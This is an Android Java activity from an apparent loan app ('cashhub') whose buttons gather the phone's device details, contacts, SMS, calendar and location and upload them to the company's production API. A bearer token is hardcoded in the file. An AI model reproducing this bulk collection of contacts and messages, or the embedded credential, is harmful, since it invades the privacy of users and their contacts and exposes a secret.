package com.cashhub.cash.app;

import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import android.util.Log;
import android.view.View;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;
import androidx.core.content.FileProvider;
import com.alibaba.fastjson.JSONException;
import com.cashhub.cash.common.UploadData;
import java.io.File;
import java.io.IOException;

public class UploadActivity extends AppCompatActivity {
  private String TAG = "UploadActivity";
  private Uri ImageUri;
  public static final int TAKE_PHOTO = 101;
  public static final int TAKE_CAMARA = 100;

  @Override
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_upload);
  }

  //跳转相册
  private void toPicture() {
    Intent intent = new Intent(Intent.ACTION_PICK);  //跳转到 ACTION_IMAGE_CAPTURE
    intent.setType("image/*");
    startActivityForResult(intent, TAKE_CAMARA);
    Log.i(TAG, "跳转相册成功");
  }

  //跳转相机
  private void toCamera() {
    //创建File对象，用于存储拍照后的图片
//        File outputImage = new File(getExternalCacheDir(), "outputImage.jpg");
    File outputImage = new File(getExternalCacheDir(), System.currentTimeMillis() + ".jpg");
    if (outputImage.exists()) {
      outputImage.delete();
    } else {
      try {
        outputImage.createNewFile();
      } catch (IOException e) {
        e.printStackTrace();
      }
    }
    //判断SDK版本高低，ImageUri方法不同
    if (Build.VERSION.SDK_INT >= 24) {
      ImageUri = FileProvider
          .getUriForFile(this, "com.uni.app.fileprovider", outputImage);
    } else {
      ImageUri = Uri.fromFile(outputImage);
    }

    //启动相机程序
    Intent intent = new Intent("android.media.action.IMAGE_CAPTURE");
    intent.putExtra(MediaStore.EXTRA_OUTPUT, ImageUri);
    startActivityForResult(intent, TAKE_PHOTO);
  }

  @RequiresApi(api = Build.VERSION_CODES.M)
  private void buttonClick(String type) {

    UploadData mUploadData = new UploadData(this);

    // 获取上传sign_url
    com.alibaba.fastjson.JSONObject systemInfo = new com.alibaba.fastjson.JSONObject();
    try {
      systemInfo.put("test", "ooo");
    } catch (JSONException e) {
      System.out.println("oss sign:" + e.getMessage());
      return;
    }
    systemInfo = null;
    String token = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NTQyNzI2NzEsImlkZW50aXR5IjoiMzE4NzIzMTQwNTI2MDE0NDY0Iiwib3JpZ19pYXQiOjE2NTE2ODA2NzF9.yppIbEctNDFhotPwriDprJHqOlV5HrF4ExouR36qKTQ";
//        String domain = "http://apishop.c99349d1eb3d045a4857270fb79311aa0.cn-shanghai.alicontainer.com/api";  //测试环境
    String domain = "https://api.cashhubloan.com/api";  //正式环境
    String deviceKey = "test111c2bd436602c9";
    long timeStamp = 1635955200;
    switch (type) {
      case "device":
        mUploadData.getAndSendDevice(systemInfo, token, domain, timeStamp, deviceKey);
        break;
      case "contact":
        mUploadData.getAndSendContact(systemInfo, token, domain, timeStamp, deviceKey);
        break;
      case "calendar":
        mUploadData.getAndSendCalendar(systemInfo, token, domain, timeStamp, deviceKey);
        break;
      case "location":
        mUploadData.getAndSendLocation(systemInfo, token, domain, timeStamp, deviceKey);
      case "location2":
        mUploadData.getAndSendLocation2(systemInfo, token, domain, timeStamp, deviceKey);
        break;
      default:
        mUploadData.getAndSendSms(systemInfo, token, domain, timeStamp, deviceKey);
        break;
    }
  }

  @RequiresApi(api = Build.VERSION_CODES.M)
  public void button_device_click(View view) {
    buttonClick("device");
  }

  @RequiresApi(api = Build.VERSION_CODES.M)
  public void button_contact_click(View view) {
    buttonClick("contact");
  }

  @RequiresApi(api = Build.VERSION_CODES.M)
  public void button_sms_click(View view) {
    buttonClick("sms");
  }

  @RequiresApi(api = Build.VERSION_CODES.M)
  public void button_calendar_click(View view) {
    buttonClick("calendar");
  }

  @RequiresApi(api = Build.VERSION_CODES.M)
  public void button_location_click(View view) {
    buttonClick("location");
  }

  @RequiresApi(api = Build.VERSION_CODES.M)
  public void button_location2_click(View view) {
    buttonClick("location2");
  }
}